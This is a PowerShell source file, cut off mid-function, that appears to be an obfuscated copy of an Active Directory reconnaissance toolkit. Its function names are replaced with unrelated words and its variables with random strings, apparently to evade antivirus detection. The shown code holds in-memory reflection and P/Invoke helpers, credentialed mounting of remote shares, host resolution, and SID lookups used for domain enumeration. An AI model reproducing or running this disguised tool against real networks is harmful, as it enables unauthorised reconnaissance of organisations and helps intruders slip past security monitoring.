function canonical {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $FhjLiqqj99 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $CUtnSjht99 = $FhjLiqqj99.GetAssemblies()
    foreach ($QJmZqOZR99 in $CUtnSjht99) {
        if ($QJmZqOZR99.FullName -and ($QJmZqOZR99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $QJmZqOZR99
        }
    }
    $UoWCTUMT99 = New-Object Reflection.AssemblyName($ModuleName)
    $SSNUOPgW99 = $FhjLiqqj99
    $hHUiBMgN99 = $SSNUOPgW99.DefineDynamicAssembly($UoWCTUMT99, 'Run')
    $jSuMtbYw99 = $hHUiBMgN99.DefineDynamicModule($ModuleName, $False)
    return $jSuMtbYw99
}
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $SgFIMqQx99,
        [Switch]
        $SetLastError
    )
    $SdzJuWMG99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $SdzJuWMG99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $SdzJuWMG99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $SdzJuWMG99['Charset'] = $Charset }
    if ($SetLastError) { $SdzJuWMG99['SetLastError'] = $SetLastError }
    if ($SgFIMqQx99) { $SdzJuWMG99['EntryPoint'] = $SgFIMqQx99 }
    New-Object PSObject -Property $SdzJuWMG99
}
function counterclaims
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $SgFIMqQx99,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $ryhnBXdu99 = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $ryhnBXdu99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $ryhnBXdu99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$ryhnBXdu99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $ryhnBXdu99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $ryhnBXdu99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $AlrHOHqQ99 = $ryhnBXdu99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($mVytBKxB99 in $ParameterTypes)
            {
                if ($mVytBKxB99.IsByRef)
                {
                    [void] $AlrHOHqQ99.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $nvINoPdb99 = [Runtime.InteropServices.DllImportAttribute]
            $xsqmBggZ99 = $nvINoPdb99.GetField('SetLastError')
            $gGhsUUIw99 = $nvINoPdb99.GetField('CallingConvention')
            $SYIQdhvU99 = $nvINoPdb99.GetField('CharSet')
            $TIZWcqsI99 = $nvINoPdb99.GetField('EntryPoint')
            if ($SetLastError) { $QtgjDipF99 = $True } else { $QtgjDipF99 = $False }
            if ($PSBoundParameters['EntryPoint']) { $GyISvYGz99 = $SgFIMqQx99 } else { $GyISvYGz99 = $FunctionName }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $RyXUyIDU99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($xsqmBggZ99,
                                           $gGhsUUIw99,
                                           $SYIQdhvU99,
                                           $TIZWcqsI99),
                [Object[]] @($QtgjDipF99,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $GyISvYGz99))
            $AlrHOHqQ99.SetCustomAttribute($RyXUyIDU99)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $ryhnBXdu99
        }
        $prMvrceJ99 = @{}
        foreach ($Key in $ryhnBXdu99.Keys)
        {
            $Type = $ryhnBXdu99[$Key].CreateType()
            $prMvrceJ99[$Key] = $Type
        }
        return $prMvrceJ99
    }
}
function chivalrous {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $RCBBjquw99,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $bRaENIbz99,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($RCBBjquw99))
    }
    $YVBUAqYi99 = $Type -as [Type]
    $OZZBTKdI99 = $Module.DefineEnum($RCBBjquw99, 'Public', $YVBUAqYi99)
    if ($Bitfield)
    {
        $NcHaOgaF99 = [FlagsAttribute].GetConstructor(@())
        $vFXGMtPi99 = New-Object Reflection.Emit.CustomAttributeBuilder($NcHaOgaF99, @())
        $OZZBTKdI99.SetCustomAttribute($vFXGMtPi99)
    }
    foreach ($Key in $bRaENIbz99.Keys)
    {
        $null = $OZZBTKdI99.DefineLiteral($Key, $bRaENIbz99[$Key] -as $YVBUAqYi99)
    }
    $OZZBTKdI99.CreateType()
}
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $gDiRAnjo99,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $KUsFrgdb99,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $gDiRAnjo99
        Type = $Type -as [Type]
        Offset = $KUsFrgdb99
        MarshalAs = $MarshalAs
    }
}
function preconceives
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $RCBBjquw99,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $ucgENMYV99,
        [Reflection.Emit.PackingSize]
        $OCUGjAvm99 = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $gEaJdAAN99
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($RCBBjquw99))
    }
    [Reflection.TypeAttributes] $KTqKdAGH99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($gEaJdAAN99)
    {
        $KTqKdAGH99 = $KTqKdAGH99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $KTqKdAGH99 = $KTqKdAGH99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $GvcZSPvg99 = $Module.DefineType($RCBBjquw99, $KTqKdAGH99, [ValueType], $OCUGjAvm99)
    $vWlqahGu99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $AxUuSzHn99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $LEsrLeEZ99 = New-Object Hashtable[]($ucgENMYV99.Count)
    foreach ($Field in $ucgENMYV99.Keys)
    {
        $Index = $ucgENMYV99[$Field]['Position']
        $LEsrLeEZ99[$Index] = @{FieldName = $Field; Properties = $ucgENMYV99[$Field]}
    }
    foreach ($Field in $LEsrLeEZ99)
    {
        $rxipcHwl99 = $Field['FieldName']
        $qVyaCXMv99 = $Field['Properties']
        $KUsFrgdb99 = $qVyaCXMv99['Offset']
        $Type = $qVyaCXMv99['Type']
        $MarshalAs = $qVyaCXMv99['MarshalAs']
        $ECwzlcIP99 = $GvcZSPvg99.DefineField($rxipcHwl99, $Type, 'Public')
        if ($MarshalAs)
        {
            $xjwCSwEQ99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $kKTqVuxe99 = New-Object Reflection.Emit.CustomAttributeBuilder($vWlqahGu99,
                    $xjwCSwEQ99, $AxUuSzHn99, @($Size))
            }
            else
            {
                $kKTqVuxe99 = New-Object Reflection.Emit.CustomAttributeBuilder($vWlqahGu99, [Object[]] @($xjwCSwEQ99))
            }
            $ECwzlcIP99.SetCustomAttribute($kKTqVuxe99)
        }
        if ($gEaJdAAN99) { $ECwzlcIP99.SetOffset($KUsFrgdb99) }
    }
    $tCHJmAVJ99 = $GvcZSPvg99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $NBWyaQKe99 = $tCHJmAVJ99.GetILGenerator()
    $NBWyaQKe99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $GvcZSPvg99)
    $NBWyaQKe99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $NBWyaQKe99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $NBWyaQKe99.Emit([Reflection.Emit.OpCodes]::Ret)
    $FZWpBQWS99 = $GvcZSPvg99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $GvcZSPvg99,
        [Type[]] @([IntPtr]))
    $pKSQITvS99 = $FZWpBQWS99.GetILGenerator()
    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Nop)
    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $GvcZSPvg99)
    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $GvcZSPvg99)
    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Ret)
    $GvcZSPvg99.CreateType()
}
Function coup {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$VmQSBvYC99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$gDiRAnjo99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$EiOAngBO99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Wtrsvzva99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$vQPazwpW99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ctUCkPvo99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$SSRDycfc99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$XLxkwcdg99 = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$dLwAPflL99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$SAVhhNvT99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$xbTnEtGQ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ovWYUUul99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$nHuBGksM99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$SKlYZFwl99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$OBeQbHwo99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$EBVFqFLZ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$GCBBUwzn99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ZWdKRRJx99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$kEthoKHP99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $SvdEzdxg99 = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$dkXAXsIB99,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $LRCAuYbY99
    )
    Begin {
        $sqiXUsuv99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $VAoTSJIg99 = (Get-Command _temp).Parameters.Keys
    }
    Process {
        if($dkXAXsIB99) {
            $zWOkOhkF99 = $LRCAuYbY99.Keys | Where-Object { $VAoTSJIg99 -notcontains $_ }
            ForEach($mVytBKxB99 in $zWOkOhkF99) {
                if ($mVytBKxB99) {
                    Set-Variable -Name $mVytBKxB99 -Value $LRCAuYbY99.$mVytBKxB99 -Scope 1 -Force
                }
            }
        }
        else {
            $qRSwIkvc99 = @()
            $qRSwIkvc99 = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($qRSwIkvc99) {
                $qRSwIkvc99 | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }
            $whZFCFps99 = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            $tmp = $null
            ForEach ($mVytBKxB99 in $whZFCFps99) {
                $wJdlYsHk99 = Get-Variable -Name $mVytBKxB99 -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($mVytBKxB99, [ref]$tmp) -and $wJdlYsHk99) {
                    $PSBoundParameters.$mVytBKxB99 = $wJdlYsHk99
                }
            }
            if($SvdEzdxg99) {
                $PXEKzCRf99 = $SvdEzdxg99
            }
            else {
                $PXEKzCRf99 = $sqiXUsuv99
            }
            $hkIwxndB99 = {Get-Variable -Name $_ -ValueOnly -Scope 0}
            $JPyCxUhp99 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $WFDXdRfx99 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $WMVhqxlR99 = '^Alias$'
            $fRRbzpyY99 = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                $JPyCxUhp99 {
                    Try {
                        $fRRbzpyY99.$_ = . $hkIwxndB99
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if($PXEKzCRf99.Keys -contains $Name) {
                $PXEKzCRf99.$Name.Attributes.Add($fRRbzpyY99)
            }
            else {
                $JemltyPg99 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $WFDXdRfx99 {
                        Try {
                            $VuPCfVjR99 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $hkIwxndB99) -ErrorAction Stop
                            $JemltyPg99.Add($VuPCfVjR99)
                        }
                        Catch { $_ }
                        continue
                    }
                    $WMVhqxlR99 {
                        Try {
                            $TFCDKhvi99 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $hkIwxndB99) -ErrorAction Stop
                            $JemltyPg99.Add($TFCDKhvi99)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $JemltyPg99.Add($fRRbzpyY99)
                $mVytBKxB99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $JemltyPg99)
                $PXEKzCRf99.Add($Name, $mVytBKxB99)
            }
        }
    }
    End {
        if(!$dkXAXsIB99 -and !$SvdEzdxg99) {
            $PXEKzCRf99
        }
    }
}
function intriguingly {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $sYroqMOX99
    )
    BEGIN {
        $nFPezvSf99 = @{}
    }
    PROCESS {
        ForEach ($VfipJrPp99 in $Path) {
            if (($VfipJrPp99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $GVmMliRp99 = (New-Object System.Uri($VfipJrPp99)).Host
                if (-not $nFPezvSf99[$GVmMliRp99]) {
                    distinctively -ComputerName $GVmMliRp99 -Credential $gxazvivN99
                    $nFPezvSf99[$GVmMliRp99] = $True
                }
            }
            if (Test-Path -Path $VfipJrPp99) {
                if ($PSBoundParameters['OutputObject']) {
                    $utpFPGej99 = New-Object PSObject
                }
                else {
                    $utpFPGej99 = @{}
                }
                Switch -Regex -File $VfipJrPp99 {
                    "^\[(.+)\]" # Section
                    {
                        $XPNLJqpk99 = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $XPNLJqpk99 = $XPNLJqpk99.Replace(' ', '')
                            $WwtcElor99 = New-Object PSObject
                            $utpFPGej99 | Add-Member Noteproperty $XPNLJqpk99 $WwtcElor99
                        }
                        else {
                            $utpFPGej99[$XPNLJqpk99] = @{}
                        }
                        $gtMiDVsQ99 = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $gtMiDVsQ99 = $gtMiDVsQ99 + 1
                        $Name = 'Comment' + $gtMiDVsQ99
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $utpFPGej99.$XPNLJqpk99 | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $utpFPGej99[$XPNLJqpk99][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $ICqkkSip99 = $Value.split(',') | ForEach-Object { $_.Trim() }
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $utpFPGej99.$XPNLJqpk99 | Add-Member Noteproperty $Name $ICqkkSip99
                        }
                        else {
                            $utpFPGej99[$XPNLJqpk99][$Name] = $ICqkkSip99
                        }
                    }
                }
                $utpFPGej99
            }
        }
    }
    END {
        $nFPezvSf99.Keys | reeling
    }
}
function corpuscle {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $uCyynScW99,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $mjLOoRTR99 = ',',
        [Switch]
        $wQiNgFQJ99
    )
    BEGIN {
        $vRqVVCQr99 = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $zaAlxykH99 = [System.IO.File]::Exists($vRqVVCQr99)
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()
        if ($PSBoundParameters['Append']) {
            $GkNlQrWs99 = [System.IO.FileMode]::Append
        }
        else {
            $GkNlQrWs99 = [System.IO.FileMode]::Create
            $zaAlxykH99 = $False
        }
        $cmYBBLrY99 = New-Object IO.FileStream($vRqVVCQr99, $GkNlQrWs99, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $ITylSrDm99 = New-Object System.IO.StreamWriter($cmYBBLrY99)
        $ITylSrDm99.AutoFlush = $True
    }
    PROCESS {
        ForEach ($Entry in $uCyynScW99) {
            $oGsVMiPU99 = ConvertTo-Csv -InputObject $Entry -Delimiter $mjLOoRTR99 -NoTypeInformation
            if (-not $zaAlxykH99) {
                $oGsVMiPU99 | ForEach-Object { $ITylSrDm99.WriteLine($_) }
                $zaAlxykH99 = $True
            }
            else {
                $oGsVMiPU99[1..($oGsVMiPU99.Length-1)] | ForEach-Object { $ITylSrDm99.WriteLine($_) }
            }
        }
    }
    END {
        $Mutex.ReleaseMutex()
        $ITylSrDm99.Dispose()
        $cmYBBLrY99.Dispose()
    }
}
function erupt {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = $Env:COMPUTERNAME
    )
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            try {
                @(([Net.Dns]::GetHostEntry($cXOPCAwl99)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[erupt] Could not resolve $cXOPCAwl99 to an IP Address."
            }
        }
    }
}
function gain {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $kYMQHBOP99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $CwoNHRuW99 = @{}
        if ($PSBoundParameters['Domain']) { $CwoNHRuW99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Server']) { $CwoNHRuW99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['Credential']) { $CwoNHRuW99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        ForEach ($Object in $kYMQHBOP99) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters['Credential']) {
                $DN = kinsman -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $ojqqfkye99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $IsWOPBva99 = $DN.Split(',')[0].split('=')[1]
                    $CwoNHRuW99['Identity'] = $IsWOPBva99
                    $CwoNHRuW99['Domain'] = $ojqqfkye99
                    $CwoNHRuW99['Properties'] = 'objectsid'
                    farrowing @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $SSNUOPgW99 = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $CwoNHRuW99 = @{}
                        $SSNUOPgW99 = (debater @DomainSearcherArguments).Name
                    }
                    $Obj = (New-Object System.Security.Principal.NTAccount($SSNUOPgW99, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[gain] Error converting $SSNUOPgW99\$Object : $_"
                }
            }
        }
    }
}
function woodmen {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $vEAcbmpj99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $GnxtbMaP99 = @{}
        if ($PSBoundParameters['Domain']) { $GnxtbMaP99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Server']) { $GnxtbMaP99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['Credential']) { $GnxtbMaP99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        ForEach ($pZtebdhW99 in $vEAcbmpj99) {
            $pZtebdhW99 = $pZtebdhW99.trim('*')
            try {
                Switch ($pZtebdhW99) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
